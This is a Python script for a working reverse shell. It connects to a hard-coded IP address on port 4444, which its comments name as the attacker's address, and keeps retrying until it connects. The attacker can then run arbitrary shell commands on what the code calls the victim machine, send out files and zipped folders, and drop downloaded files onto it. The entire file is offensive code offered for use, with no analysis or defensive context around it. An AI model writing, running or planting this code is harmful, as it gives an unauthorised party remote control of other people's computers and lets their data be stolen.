import socket
import subprocess
import os
import time
import zipfile

server_addr = '93.172.215.120'  # Replace with the attacker's IP address
server_port = 4444  # Port to listen on

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Function to upload a file from the victim machine to the attacker
def upload_file(file_path):
    if os.path.isdir(file_path):  # If it's a folder, we need to zip it
        try:
            zip_path = f"{file_path}.zip"
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(file_path):
                    for file in files:
                        zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), file_path))
            # Send the zip file
            with open(zip_path, 'rb') as f:
                file_data = f.read()
                soc.send(file_data)
            os.remove(zip_path)  # Optionally, remove the zip file after sending
            return "Folder uploaded successfully."
        except Exception as e:
            return f"Error uploading folder: {str(e)}"
    else:  # It's a normal file, just send it
        try:
            with open(file_path, 'rb') as f:
                file_data = f.read()
                soc.send(file_data)
            return "File uploaded successfully."
        except Exception as e:
            return f"Error uploading file: {str(e)}"

# Function to download a file from the attacker machine to the victim
def download_file(file_path):
    try:
        with open(file_path, 'wb') as f:
            file_data = soc.recv(1024)  # Receive data from the attacker
            f.write(file_data)
            return f"File {file_path} downloaded successfully."
    except Exception as e:
        return f"Error downloading file: {str(e)}"

# Function to log commands received by the reverse shell
def log_command(command):
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
    with open('command_log.txt', 'a') as log_file:
        log_file.write(f"[{timestamp}] {command}\n")

# Function to execute commands on the victim machine
def execute_command(command):
    try:
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
        if result.returncode == 0:
            return result.stdout
        else:
            return result.stderr
    except Exception as e:
        return f"Error executing command: {str(e)}"

# Function to reconnect if the connection is lost
def reconnect():
    while True:
        try:
            soc.connect((server_addr, server_port))  # Attempt to reconnect
            print(f"Connected securely to {server_addr}:{server_port}")
            break
        except ConnectionError as e:
            print(f"Connection failed, retrying in 5 seconds: {e}")
            time.sleep(5)  # Retry connection after 5 seconds

# Reconnect on initial run if necessary
reconnect()

flag = 0
while True and flag == 0:
    try:
        command = soc.recv(1024).decode().strip()  # Receive command from the attacker
    except ConnectionError:
        print("Connection lost, reconnecting...")
        reconnect()  # Reconnect if the connection is lost

    if not command:
        continue

    print(f"Received command: {command}")
    log_command(command)  # Log the received command

    if command.lower() == 'stop':  # Exit condition for stopping the reverse shell
        print("Stopping the connection.")
        soc.send("Connection closed.".encode())
        flag = 1
    elif command.startswith("cd "):  # Handle 'cd' command (change directory)
        try:
            target_dir = command[3:].strip()
            os.chdir(target_dir)
            soc.send(f"Changed directory to {os.getcwd()}".encode())
        except Exception as e:
            soc.send(f"Failed to change directory: {str(e)}".encode())
    elif command.startswith("upload "):  # Upload a file or folder from the victim machine to the attacker
        file_path = command[7:].strip()
        result = upload_file(file_path)
        soc.send(result.encode())
    elif command.startswith("download "):  # Download a file from the attacker to the victim
        file_path = command[9:].strip()
        result = download_file(file_path)
        soc.send(result.encode())
    else:  # Handle normal shell commands
        result = execute_command(command)
        soc.send(result.encode())

# Close the socket connection
soc.close()